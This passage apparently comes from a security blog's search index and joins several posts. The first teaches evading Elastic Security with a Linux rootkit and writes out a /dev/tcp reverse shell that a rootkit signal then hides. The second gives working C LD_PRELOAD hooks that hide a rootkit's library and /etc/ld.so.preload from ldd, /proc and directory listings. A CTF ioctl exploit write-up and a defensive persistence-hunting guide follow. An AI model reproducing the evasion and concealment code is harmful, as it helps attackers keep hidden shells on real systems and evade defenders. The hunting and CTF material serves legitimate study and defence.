add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your 